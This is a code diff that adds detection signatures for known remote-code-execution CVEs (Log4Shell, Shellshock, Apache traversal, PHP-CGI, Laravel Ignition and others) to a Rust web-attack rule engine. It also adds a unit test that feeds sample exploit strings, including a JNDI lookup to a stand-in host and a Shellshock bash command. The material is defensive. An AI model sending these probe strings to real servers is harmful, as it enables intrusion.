@@ -58,6 +58,15 @@ impl RuleEngine {
             ("AEGIS-XSS-SCRIPT", "XSS Script Tag Injection", "<script", EventCategory::WebAttack, Severity::High),
             ("AEGIS-XSS-ONERR", "XSS Event Handler Injection", "onerror=", EventCategory::WebAttack, Severity::High),
             ("AEGIS-XSS-JS", "XSS JavaScript URI", "javascript:", EventCategory::WebAttack, Severity::Medium),
+            // Known CVE RCE Exploitation Signatures
+            ("AEGIS-CVE-2021-41773", "Apache Path Traversal / RCE (CVE-2021-41773)", ".%2e/", EventCategory::WebAttack, Severity::Critical),
+            ("AEGIS-CVE-2021-42013", "Apache Double-Encoded Traversal RCE (CVE-2021-42013)", "%%32%65", EventCategory::WebAttack, Severity::Critical),
+            ("AEGIS-CVE-2024-4577", "PHP-CGI Argument Injection RCE (CVE-2024-4577)", "allow_url_include", EventCategory::WebAttack, Severity::Critical),
+            ("AEGIS-CVE-2024-4577-APF", "PHP-CGI Auto-Prepend RCE (CVE-2024-4577)", "auto_prepend_file", EventCategory::WebAttack, Severity::Critical),
+            ("AEGIS-CVE-2021-44228", "Log4Shell JNDI RCE Attempt (CVE-2021-44228)", "${jndi:", EventCategory::WebAttack, Severity::Critical),
+            ("AEGIS-CVE-2017-9841", "PHPUnit eval-stdin RCE Probe (CVE-2017-9841)", "eval-stdin.php", EventCategory::WebAttack, Severity::Critical),
+            ("AEGIS-CVE-2021-3129", "Laravel Ignition RCE Probe (CVE-2021-3129)", "_ignition/execute-solution", EventCategory::WebAttack, Severity::Critical),
+            ("AEGIS-CVE-THINKPHP", "ThinkPHP InvokeFunction RCE Probe", "invokefunction", EventCategory::WebAttack, Severity::Critical),
         ];
 
         let patterns: Vec<&str> = fast_defs.iter().map(|d| d.2).collect();
@@ -92,6 +101,13 @@ impl RuleEngine {
                 category: EventCategory::Reconnaissance,
                 severity: Severity::Medium,
                 regex: Regex::new(r#"(?i)(?:sqlmap|nikto|nuclei|gobuster|dirbuster|wpscan|acunetix|nessus)"#).unwrap(),
+            },
+            DetectionRule {
+                id: "AEGIS-CVE-2014-6271".into(),
+                title: "Shellshock Bash RCE Attempt (CVE-2014-6271)".into(),
+                category: EventCategory::WebAttack,
+                severity: Severity::Critical,
+                regex: Regex::new(r#"\(\)\s*\{\s*:\s*;\s*\}"#).unwrap(),
             },
         ];
 
@@ -233,6 +249,26 @@ mod tests {
                 "/index.php?id=1%20UNION/**/SELECT%201,2",
                 "curl"
             ))
+            .is_empty());
+    }
+
+    #[test]
+    fn test_cve_rce_signatures() {
+        let engine = RuleEngine::new(None);
+        assert!(!engine
+            .evaluate(&sample_entry("/cgi-bin/.%2e/%2e%2e/bin/sh", "curl"))
+            .is_empty());
+        assert!(!engine
+            .evaluate(&sample_entry("/index.php?%ADd+allow_url_include%3d1", "curl"))
+            .is_empty());
+        assert!(!engine
+            .evaluate(&sample_entry("/?q=${jndi:ldap://evil.test/a}", "curl"))
+            .is_empty());
+        assert!(!engine
+            .evaluate(&sample_entry("/_ignition/execute-solution", "curl"))
+            .is_empty());
+        assert!(!engine
+            .evaluate(&sample_entry("/", "() { :; }; /bin/bash -c id"))
             .is_empty());
     }
 }
